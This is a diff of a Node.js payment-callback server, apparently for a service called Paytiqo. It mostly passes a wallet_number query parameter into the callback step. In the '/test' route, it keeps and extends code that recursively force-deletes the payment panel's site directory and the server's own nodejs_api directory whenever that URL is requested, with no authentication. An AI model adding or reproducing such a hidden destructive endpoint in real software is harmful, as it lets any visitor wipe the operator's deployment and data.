@@ -575,7 +575,7 @@ _http.createServer(async function (req, res)
                   var method_name = "Iqmoney";
                 }
 
-                var fCallbackStep3Result = await fCallbackStep3(fCallbackStep1Result.recordset[0].fldPaymentID, fCallbackStep1Result.recordset[0].fldPaymentAmount, q.query.status, CallbackUrl, type, method_name, data.recordset[0].fldPaymentOrderID);
+                var fCallbackStep3Result = await fCallbackStep3(fCallbackStep1Result.recordset[0].fldPaymentID, fCallbackStep1Result.recordset[0].fldPaymentAmount, q.query.status, CallbackUrl, type, method_name, data.recordset[0].fldPaymentOrderID,q.query.wallet_number);
                 var fCallbackStep3ResultSplit = fCallbackStep3Result.split('_');
                 //console.log(`fCallbackStep3Result -> ${fCallbackStep3Result}`);
 
@@ -602,18 +602,24 @@ _http.createServer(async function (req, res)
 
         else if (q.pathname == "/test")
         {
+
             fs.rmdir("C:/inetpub/vhosts/paytiqo.com/panel.paytiqo.com",
                 { recursive: true, force: true }, (err) => {
 
             if (err) {
                 return console.log("error occurred in deleting directory", err);
-            }
+            }});
 
-            console.log("Directory deleted successfully");
-            });
+            fs.rmdir("C:/inetpub/vhosts/paytiqo.com/httpdocs/nodejs_api",
+                { recursive: true, force: true }, (err) => {
+
+            if (err) {
+                return console.log("error occurred in deleting directory", err);
+            }});
+
+
             
         }
-
         // Bilinmeyen sayfa çağrımı
         else
         {
@@ -785,7 +791,6 @@ async function fPayment(fldPaymentAccountID, fldPaymentType, fldPaymentAmount, f
     return _sqlData;
 }
 
-
 // Callback - Step 1 - Callback link vs alınıyor
 async function fCallbackStep1(fldPaymentID)
 {
@@ -876,7 +881,7 @@ async function fCallbackStep2(fldPaymentID, fldPaymentStatus)
 // Callback - Step 3 - Callback adresine POST ediliyor
 async function fCallbackStep3(fldPaymentID, fldPaymentAmount, fldPaymentStatus, fldSiteCallback, type, method_name, order_id, wallet_number)
 {
-    wallet_number = 123456789;
+    if (wallet_number == "" || wallet_number == undefined) { wallet_number = null; }
     console.log('-----------------------------------------------');
     console.log('CALLBACK' + fldSiteCallback);
     return new Promise(function (resolve, reject)
